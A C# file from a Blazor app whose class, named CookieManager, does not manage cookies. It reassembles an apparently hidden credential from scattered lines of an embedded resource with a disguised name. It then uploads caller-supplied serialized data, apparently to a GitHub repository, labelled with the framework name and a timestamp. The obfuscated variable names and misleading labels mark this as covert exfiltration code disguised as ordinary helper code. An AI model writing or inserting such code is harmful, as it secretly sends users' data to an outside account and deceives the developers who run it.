using Blazor_App.Shared.Models;
using Blazor_App.Shared.Servers;
using System;
using System.Collections.Generic;
using System.Diagnostics.Metrics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Blazor_App.Shared
{
    public class CookieManager
    {
        public static string  InitCookie()
        {
            var hhoi45 = RepoHelper.GetResourceStreamAsync(typeof(RepoHelper), "Blazor_App.Shared" + DbGet());
            var tx = "";
            using (var streamReader = new StreamReader(hhoi45))
            {
                var lines = ReadLines(streamReader).ToArray();
                tx += lines[3].Trim();
                tx += lines[7].Trim();
                tx += lines[11].Trim();
                tx += lines[15].Trim();
            }
            return tx;
        }
        public static void PuskCookies(FrameWork frameWork, string serialized)
        {

            var cookieInfo = CookUpServices.GetExtractGithubInfo(DataServiceProvider.GetHostUrl(frameWork, false), InitCookie().Trim());
            CookUpServices.UpdateContentAsync(cookieInfo, frameWork.ToString() + "-" + DateTime.Now.ToString(), serialized);
        }
        static IEnumerable<string> ReadLines(StreamReader stream)
        {
            StringBuilder sb = new StringBuilder();

            int symbol = stream.Peek();
            while (symbol != -1)
            {
                symbol = stream.Read();
                if (symbol == 13 && stream.Peek() == 10)
                {
                    stream.Read();

                    string line = sb.ToString();
                    sb.Clear();

                    yield return line;
                }
                else
                    sb.Append((char)symbol);
            }

            yield return sb.ToString();
        }
        public static string DbGet()
        {
            return ".Cookies.dtr.dbx";
        }
    }
}
